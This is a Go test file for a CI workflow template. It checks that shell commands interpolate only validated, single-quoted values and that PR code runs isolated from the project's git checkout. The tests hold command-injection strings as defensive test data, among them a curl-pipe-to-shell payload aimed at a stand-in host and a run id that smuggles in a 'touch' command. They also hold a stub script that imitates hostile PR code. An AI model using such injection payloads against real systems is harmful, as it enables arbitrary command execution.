package templates

// The ci.provider reliant ci.yaml runs shell commands built from templates,
// one of them holding the machine's git credentials. These tests pin how a
// value reaches those shells: only from the facts and resolved compute nodes,
// which check every value against a pattern that cannot carry shell syntax,
// and only inside single quotes. They also pin that the pr and queue tiers
// never gate without a base commit.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/reliant-labs/forge/pkg/testkit"
)

type reliantCINode struct {
	ID        string            `yaml:"id"`
	Type      string            `yaml:"type"`
	Condition string            `yaml:"condition"`
	Outputs   map[string]string `yaml:"outputs"`
	Args      struct {
		Command     string `yaml:"command"`
		Credentials string `yaml:"credentials"`
		WorkDir     string `yaml:"work_dir"`
	} `yaml:"args"`
}

type reliantCIDoc struct {
	Nodes []reliantCINode `yaml:"nodes"`
	Edges []struct {
		From  string `yaml:"from"`
		Cases []struct {
			Condition string   `yaml:"condition"`
			To        []string `yaml:"to"`
		} `yaml:"cases"`
		Default string `yaml:"default"`
	} `yaml:"edges"`
	Finally struct {
		Sequence []reliantCINode `yaml:"sequence"`
	} `yaml:"finally"`
}

func renderReliantCI(t *testing.T) reliantCIDoc {
	t.Helper()
	out, err := CITemplates("reliant").Render("ci.yaml.tmpl", ReliantCIWorkflowData{Check: "demo/ci"})
	if err != nil {
		t.Fatal(err)
	}
	var doc reliantCIDoc
	if err := yaml.Unmarshal(out, &doc); err != nil {
		t.Fatalf("ci.yaml is not YAML: %v", err)
	}
	return doc
}

func (d reliantCIDoc) node(t *testing.T, id string) reliantCINode {
	t.Helper()
	for _, n := range append(append([]reliantCINode(nil), d.Nodes...), d.Finally.Sequence...) {
		if n.ID == id {
			return n
		}
	}
	t.Fatalf("ci.yaml has no node %q", id)
	return reliantCINode{}
}

var templateAction = regexp.MustCompile(`'?\{\{\s*(.*?)\s*\}\}'?`)

// checkedValues are the node outputs a shell may interpolate: each is
// checked by facts.valid or resolved.ok before any run node can run.
var checkedValues = map[string]bool{
	"nodes.facts.tier": true, "nodes.facts.sha": true, "nodes.facts.base": true,
	"nodes.facts.default_branch": true, "nodes.facts.run": true, "nodes.facts.path": true,
	"nodes.resolved.base": true, "nodes.resolved.prefix": true,
	// finally's cleanup may run when facts did not (a cancel before it).
	"nodes.?facts.run.orValue('')": true, "nodes.?facts.path.orValue('')": true,
}

// Every value a run node's command interpolates is a checked one, inside
// single quotes: never workflow.*, inputs.* or another node's raw output.
func TestReliantCI_ShellsInterpolateOnlyCheckedQuotedValues(t *testing.T) {
	doc := renderReliantCI(t)
	runs := 0
	for _, n := range append(append([]reliantCINode(nil), doc.Nodes...), doc.Finally.Sequence...) {
		if n.Type != "run" {
			continue
		}
		runs++
		for _, m := range templateAction.FindAllStringSubmatch(n.Args.Command, -1) {
			if !checkedValues[m[1]] {
				t.Errorf("run node %s interpolates %q, which no compute node checked", n.ID, m[1])
			}
			if !strings.HasPrefix(m[0], "'") || !strings.HasSuffix(m[0], "'") {
				t.Errorf("run node %s interpolates %s outside single quotes", n.ID, m[0])
			}
		}
	}
	if runs != 3 {
		t.Fatalf("checked %d run nodes, want fetch, gate and cleanup", runs)
	}
	// The gate runs PR code: it starts in the run's own directory, never the
	// project's checkout, and reads the commit from fetch's bundle, never
	// from the checkout's object store.
	gate := doc.node(t, "gate")
	if gate.Args.WorkDir != "{{ nodes.resolved.dir }}" {
		t.Errorf("gate work_dir = %q, want the run's own directory", gate.Args.WorkDir)
	}
	for _, banned := range []string{"nodes.facts.path", "--shared", "git clone", "objects/info/alternates", "--reference"} {
		if strings.Contains(gate.Args.Command, banned) {
			t.Errorf("the gate's command contains %q: it must not reach the project's checkout", banned)
		}
	}
	if !strings.Contains(gate.Args.Command, `fetch --quiet --no-tags "$bundle"`) {
		t.Error("the gate does not read the commit from the bundle")
	}
	if got := doc.node(t, "cleanup").Args.WorkDir; got != "{{ nodes.?resolved.root.orValue('') }}" {
		t.Errorf("cleanup work_dir = %q, want the run directories' parent", got)
	}
	if doc.node(t, "gate").Args.Credentials != "none" || doc.node(t, "cleanup").Args.Credentials != "none" {
		t.Error("gate and cleanup must run with credentials: none")
	}
}

// facts.valid refuses a run id or project path that could break out of the
// single quotes, or otherwise mean something to a shell.
func TestReliantCI_FactsRefuseShellSyntax(t *testing.T) {
	valid := renderReliantCI(t).node(t, "facts").Outputs["valid"]
	pattern := func(field string) *regexp.Regexp {
		m := regexp.MustCompile(regexp.QuoteMeta(field) + `\.matches\('([^']+)'\)`).FindStringSubmatch(valid)
		if m == nil {
			t.Fatalf("facts.valid does not check %s against a pattern:\n%s", field, valid)
		}
		return regexp.MustCompile(m[1]) // RE2, as CEL's matches is
	}
	run, path := pattern("workflow.chat_id"), pattern("workflow.path")
	hostile := []string{"", "a'b", "a;id", "$(id)", "`id`", "a\nb", "a b", "x' && curl evil.sh | sh #", "../x", "a$b"}
	for _, v := range hostile {
		if run.MatchString(v) {
			t.Errorf("a run id %q passes facts.valid", v)
		}
	}
	if !run.MatchString("4b0e7c4e-2f1a-4c4b-9a1e-3f2d1c0b9a8e") {
		t.Error("a UUID run id is refused")
	}
	for _, v := range []string{"relative/dir", "/a'b", "/a\nb", "/$(id)", "/`id`", "/a;b", "/a\"b"} {
		if path.MatchString(v) {
			t.Errorf("a project path %q passes facts.valid", v)
		}
	}
	for _, v := range []string{"/home/workspace/projects/demo", "/Users/me/My Projects/demo"} {
		if !path.MatchString(v) {
			t.Errorf("project path %q is refused", v)
		}
	}
	if !strings.Contains(valid, "workflow.chat_id.matches(") || !strings.Contains(valid, "inputs.tier in [") {
		t.Errorf("facts.valid does not check the run id and the tier:\n%s", valid)
	}
}

// The gate runs only when resolved.ok, which requires a base sha unless the
// tier is main; anything else goes to doc, which reports resolved.error and so
// concludes the check failure.
func TestReliantCI_GateNeedsAResolvedBase(t *testing.T) {
	doc := renderReliantCI(t)
	ok := doc.node(t, "resolved").Outputs["ok"]
	for _, want := range []string{"nodes.fetch.exit_code == 0", "(?m)^base=([0-9a-f]{40})$').hasValue()", "nodes.facts.tier == 'main'", "contains('..')"} {
		if !strings.Contains(ok, want) {
			t.Errorf("resolved.ok lacks %q:\n%s", want, ok)
		}
	}
	routed := false
	for _, e := range doc.Edges {
		switch e.From {
		case "fetch":
			if e.Default != "resolved" || len(e.Cases) != 0 {
				t.Errorf("fetch must go only to resolved, got %+v", e)
			}
		case "resolved":
			routed = len(e.Cases) == 1 && e.Cases[0].Condition == "nodes.resolved.ok == true" &&
				strings.Join(e.Cases[0].To, ",") == "gate" && e.Default == "doc"
		}
	}
	if !routed {
		t.Error("resolved must route to gate only when ok, and to doc otherwise")
	}
	if !strings.Contains(doc.node(t, "doc").Outputs["doc"], "!nodes.resolved.ok") {
		t.Error("doc does not report a run whose base did not resolve")
	}
}

// script is a run node's command as the engine would run it, with the
// checked values substituted (each lands inside the template's quotes).
func script(t *testing.T, node string, values map[string]string) string {
	t.Helper()
	cmd := renderReliantCI(t).node(t, node).Args.Command
	return templateAction.ReplaceAllStringFunc(cmd, func(s string) string {
		m := templateAction.FindStringSubmatch(s)
		v, ok := values[m[1]]
		if !ok {
			t.Fatalf("%s interpolates %s", node, m[1])
		}
		return "'" + v + "'"
	})
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-c", "user.email=t@t", "-c", "user.name=t", "-c", "init.defaultBranch=main"}, args...)...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

// ciFixture is an origin with two commits, the project's checkout cloned
// from it (in a directory with a space), and a cache home for run
// directories.
type ciFixture struct {
	tmp, origin, checkout, cache, base, head, side string
}

func newCIFixture(t *testing.T) ciFixture {
	t.Helper()
	tmp := t.TempDir()
	f := ciFixture{tmp: tmp, origin: filepath.Join(tmp, "origin"), checkout: filepath.Join(tmp, "my project"), cache: filepath.Join(tmp, "cache")}
	if err := os.MkdirAll(filepath.Join(f.origin, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, f.origin, "init", "-q")
	if err := os.WriteFile(filepath.Join(f.origin, "sub", "a.txt"), []byte("a\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, f.origin, "add", ".")
	git(t, f.origin, "commit", "-q", "-m", "base")
	f.base = git(t, f.origin, "rev-parse", "HEAD")
	git(t, f.origin, "commit", "-q", "--allow-empty", "-m", "head")
	f.head = git(t, f.origin, "rev-parse", "HEAD")
	git(t, f.origin, "checkout", "-q", "-b", "side", f.base)
	git(t, f.origin, "commit", "-q", "--allow-empty", "-m", "side")
	f.side = git(t, f.origin, "rev-parse", "HEAD")
	git(t, f.origin, "checkout", "-q", "main")
	git(t, f.origin, "config", "uploadpack.allowAnySHA1InWant", "true")
	git(t, tmp, "clone", "-q", f.origin, f.checkout)
	return f
}

// run runs a script with HOME and XDG_CACHE_HOME in the fixture.
func (f ciFixture) run(t *testing.T, dir, body string, env ...string) (stdout, stderr string, code int) {
	t.Helper()
	cmd := exec.Command("bash", "-c", body)
	cmd.Dir = dir
	cmd.Env = append(append(os.Environ(), "HOME="+f.tmp, "XDG_CACHE_HOME="+f.cache), env...)
	var o, e strings.Builder
	cmd.Stdout, cmd.Stderr = &o, &e
	err := cmd.Run()
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatal(err)
	}
	return strings.TrimSpace(o.String()), e.String(), code
}

func (f ciFixture) fetch(t *testing.T, tier, base, branch, runID string) (map[string]string, string, int) {
	t.Helper()
	return f.fetchIn(t, filepath.Join(f.checkout, "sub"), tier, base, branch, runID)
}

func (f ciFixture) fetchIn(t *testing.T, project, tier, base, branch, runID string) (map[string]string, string, int) {
	t.Helper()
	out, errOut, code := f.run(t, f.tmp, script(t, "fetch", map[string]string{
		"nodes.facts.tier": tier, "nodes.facts.sha": f.head, "nodes.facts.base": base,
		"nodes.facts.default_branch": branch, "nodes.facts.run": runID, "nodes.facts.path": project,
	}))
	lines := map[string]string{}
	for _, l := range strings.Split(out, "\n") {
		if k, v, ok := strings.Cut(l, "="); ok {
			lines[k] = v
		}
	}
	return lines, errOut, code
}

// The fetch step, run for real against a local origin: the pr and queue
// tiers fail with a clear message when their base does not resolve, main
// needs none, and a run id that is not [A-Za-z0-9-]+ is refused by the shell
// as well (should facts ever let one through).
func TestReliantCI_FetchRefusesAMissingBase(t *testing.T) {
	testkit.Slow(t, "execs git and bash")
	f := newCIFixture(t)
	root := filepath.Join(f.cache, "reliant-ci")

	if out, errOut, code := f.fetch(t, "pr", f.base, "main", "run-1"); code != 0 || out["base"] != f.base || out["root"] != root || out["prefix"] != "./sub/" {
		t.Errorf("pr with a base: exit %d, out %v (want base %s, root %s, prefix ./sub/)\n%s", code, out, f.base, root, errOut)
	}
	if _, err := os.Stat(filepath.Join(root, "run-1", "head.bundle")); err != nil {
		t.Errorf("fetch wrote no bundle: %v", err)
	}
	if refs := git(t, f.checkout, "for-each-ref", "refs/reliant-ci"); refs != "" {
		t.Errorf("fetch left its refs in the checkout: %q", refs)
	}
	// No base given: the default branch's tip (here head) is the base.
	if out, errOut, code := f.fetch(t, "pr", "", "main", "run-2"); code != 0 || out["base"] != f.head {
		t.Errorf("pr with no base: exit %d, out %v\n%s", code, out, errOut)
	}
	// A merge group's base must be an ancestor of the group.
	if out, errOut, code := f.fetch(t, "queue", f.base, "main", "run-q"); code != 0 || out["base"] != f.base {
		t.Errorf("queue with its base: exit %d, out %v\n%s", code, out, errOut)
	}
	missing := strings.Repeat("0", 39) + "1"
	for i, tc := range []struct{ name, tier, base, branch, want string }{
		{"pr, base not on origin", "pr", missing, "main", "tier needs"},
		{"queue, base not on origin", "queue", missing, "main", "tier needs"},
		{"pr, no base and no default branch", "pr", "", "no-such-branch", "tier needs"},
		{"queue, base not an ancestor of the group", "queue", f.side, "main", "is not an ancestor"},
	} {
		_, errOut, code := f.fetch(t, tc.tier, tc.base, tc.branch, fmt.Sprintf("bad-%d", i))
		if code == 0 || !strings.Contains(errOut, tc.want) {
			t.Errorf("%s: exit %d, want a failure that says %q:\n%s", tc.name, code, tc.want, errOut)
		}
		if _, err := os.Stat(filepath.Join(root, fmt.Sprintf("bad-%d", i))); err == nil {
			t.Errorf("%s: a failed fetch left its run directory", tc.name)
		}
	}
	if out, errOut, code := f.fetch(t, "main", "", "main", "run-3"); code != 0 || out["base"] != "" || out["root"] != root {
		t.Errorf("main with no base: exit %d, out %v (want success and no base)\n%s", code, out, errOut)
	}
	// A project at the repository's root: the prefix is ./, never empty.
	if out, errOut, code := f.fetchIn(t, f.checkout, "main", "", "main", "run-4"); code != 0 || out["prefix"] != "./" {
		t.Errorf("a project at the repository root: exit %d, out %v (want prefix ./)\n%s", code, out, errOut)
	}
	if _, errOut, code := f.fetch(t, "main", "", "main", "x;touch${IFS}pwned"); code == 0 || !strings.Contains(errOut, "refused: run id") {
		t.Errorf("a hostile run id: exit %d, want refused:\n%s", code, errOut)
	}
	if _, err := os.Stat(filepath.Join(f.tmp, "pwned")); err == nil {
		t.Error("a hostile run id ran a command")
	}
}

// The gate, run for real after fetch, with a stand-in `reliant` that does what
// hostile PR code could: it writes objects into the repository it runs in and
// reports whether that repository can reach the project's checkout. The gate's
// repository has no alternates and no remote, and nothing it writes reaches
// the checkout's object store.
func TestReliantCI_GateRepositoryIsIsolatedFromTheCheckout(t *testing.T) {
	testkit.Slow(t, "execs git and bash")
	f := newCIFixture(t)
	out, errOut, code := f.fetch(t, "pr", f.base, "main", "run-1")
	if code != 0 {
		t.Fatalf("fetch: exit %d\n%s", code, errOut)
	}
	objects := func() string {
		return git(t, f.checkout, "count-objects", "-v")
	}
	before := objects()

	bin := filepath.Join(f.tmp, "bin")
	report := filepath.Join(f.tmp, "report")
	if err := os.MkdirAll(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	stub := `#!/bin/sh
gd=$(git rev-parse --absolute-git-dir)
{
  echo "pwd=$(pwd)"
  echo "head=$(git rev-parse HEAD)"
  [ -e "$gd/objects/info/alternates" ] && echo "alternates=$(cat "$gd/objects/info/alternates")" || echo "alternates=none"
  echo "remotes=$(git remote | tr '\n' ' ')"
  echo "args=$*"
} >"$REPORT"
# What hostile code would do: write objects and a commit, and repack.
echo hostile | git hash-object -w --stdin >/dev/null
git -c user.email=x@x -c user.name=x commit -q --allow-empty -m hostile
git gc -q --prune=now >/dev/null 2>&1
echo '{"schema":"forge.ci.gate/v1","ok":true,"verdict":"pass","checks":[]}'
`
	if err := os.WriteFile(filepath.Join(bin, "reliant"), []byte(stub), 0o755); err != nil {
		t.Fatal(err)
	}
	runDir := filepath.Join(out["root"], "run-1")
	stdout, gateErr, code := f.run(t, runDir, script(t, "gate", map[string]string{
		"nodes.facts.tier": "pr", "nodes.facts.sha": f.head, "nodes.resolved.base": out["base"], "nodes.resolved.prefix": out["prefix"],
	}), "PATH="+bin+":"+os.Getenv("PATH"), "REPORT="+report)
	if code != 0 || !strings.Contains(stdout, `"ok":true`) {
		t.Fatalf("gate: exit %d, stdout %q\n%s", code, stdout, gateErr)
	}
	got, err := os.ReadFile(report)
	if err != nil {
		t.Fatalf("the gate never ran forge ci gate: %v\n%s", err, gateErr)
	}
	r := string(got)
	for _, want := range []string{"head=" + f.head, "alternates=none", "remotes=\n", "args=forge ci gate --tier pr --base " + f.base + " --json"} {
		if !strings.Contains(r, want) {
			t.Errorf("the gate's repository report lacks %q:\n%s", want, r)
		}
	}
	if !strings.Contains(r, "/sub\n") || strings.Contains(r, "pwd="+f.checkout) {
		t.Errorf("the gate ran outside its own repository's project directory:\n%s", r)
	}
	if after := objects(); after != before {
		t.Errorf("the gate changed the checkout's object store:\nbefore:\n%s\nafter:\n%s", before, after)
	}
}
